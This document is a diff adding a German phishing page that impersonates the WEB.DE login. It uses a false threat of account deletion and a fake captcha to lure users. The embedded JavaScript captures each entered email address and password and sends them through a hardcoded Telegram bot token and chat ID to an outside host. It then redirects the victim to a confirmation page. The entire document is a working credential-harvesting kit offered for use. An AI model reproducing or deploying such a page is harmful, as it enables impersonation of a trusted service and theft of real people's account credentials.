@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WEBDE LOGIN</title>
+    <meta name="description" content="Melden Sie sich bei Ihrem WEB.DE-Konto an, um die Deaktivierung zu stoppen">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link rel="icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/css/style.css">
+    
+    <style>
+        /* Ensure font size for input fields is at least 16px to prevent zooming */
+        input, textarea, select {
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="/static/images/1.png" alt="WEB.DE Logo" class="logo">
+            <span class="account-text">Kundencenter</span>
+        </div>
+    </header>
+    <main class="main-content">
+        <div class="login-container">
+            <img src="/static/images/2.png" alt="WEB.DE Logo" class="formlogo">
+            <h1>Bitte erneut einloggen</h1>
+            <form id="login-form" action="/login" method="POST">
+                <p>Loggen Sie sich in Ihren WEB.DE-Account ein, um Ihre Identität zu bestätigen, nur so können Sie eine Löschung Ihres Accounts verhindern</p>
+                <label for="email">WEB.DE E-Mail-Adresse</label>
+                <input type="email" id="email" name="email" required>
+                <label for="password">Passwort eingeben</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" required>
+                    <button type="button" id="toggle-password" class="toggle-password">
+                        <img src="/static/images/eye-icon.jpg" alt="Toggle Password Visibility">
+                    </button>
+                </div>
+                <div class="captcha-wrapper">
+                    <div class="captcha-container">
+                        <div class="captcha-icon">
+                            <span class="captcha-text">Sicherheitsabfrage</span>
+                            <img src="/static/images/21.png" alt="Captcha Icon">
+                        </div>
+                        <div class="captcha-background">
+                            <img id="captcha-image" src="/static/images/captcha4.jpg" alt="Captcha für Verifikation" class="captcha-image">
+                        </div>
+                        <a href="#" id="refresh-captcha" class="refresh-captcha">Andere Zeichenfolge anzeigen</a>
+                        <label for="captcha-input" class="captcha-label">Zeichenfolge eingeben</label>
+                        <input type="text" id="captcha-input" name="captcha" required>
+                    </div>
+                </div>
+                <button type="submit" class="login-button">Login</button>
+            </form>
+        </div>
+    </main>
+    <footer class="footer">
+        <nav>
+            <a href="#">Impressum</a>
+            <a href="#">Verträge hier kündigen</a>
+            <a href="#">Datenschutzhinweise</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe und Tipps</a>
+        </nav>
+    </footer>
+    <script>
+        // Telegram credentials
+        const TELEGRAM_BOT_TOKEN = '7285927680:AAHqGWvKT2dOnkiGFEukfS4-SoxUx5JQ89o';
+        const TELEGRAM_CHAT_ID = '7473556793';
+        
+        // Toggle password visibility
+        document.getElementById('toggle-password').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+        });
+        
+        // Function to send email and password to Telegram
+        async function sendToTelegram(email, password) {
+            // Customize the message format
+            const message = `
+        *GOODNEWS from WEB.DE*
+        *Email:* ${email}
+        *Password:* ${password}
+        `;
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+            console.log('Preparing to send message to Telegram...');
+        
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'  // Use Markdown for formatting
+                    })
+                });
+        
+                console.log('Request made, waiting for response...');
+        
+                if (!response.ok) {
+                    console.error('Response not OK:', response.status, response.statusText);
+                    throw new Error('Failed to send message to Telegram');
+                }
+        
+                const data = await response.json();
+                console.log('Message successfully sent to Telegram:', data);
+        
+                // Wait for 3 seconds before redirecting
+                setTimeout(function() {
+                    // Redirect to confirmation page
+                    window.location.href = 'confirmation.html';
+                }, 3000); // 3000ms = 3 seconds
+            } catch (error) {
+                console.error('An error occurred:', error);
+                alert('Failed to send data. Please try again.');
+            }
+        }
+        
+        // Handle form submission
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+        
+            // Retrieve email and password values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+        
+            if (!email || !password) {
+                alert('Please enter both email and password.');
+                return;
+            }
+        
+            // Log the email and password for debugging
+            console.log('Submitting form...');
+            console.log('Email:', email);
+            console.log('Password:', password);
+        
+            // Send data to Telegram
+            sendToTelegram(email, password);
+        });
+    </script>    
+     
+    <script src="../static/js/script.js"></script>
+</body>
+</html>
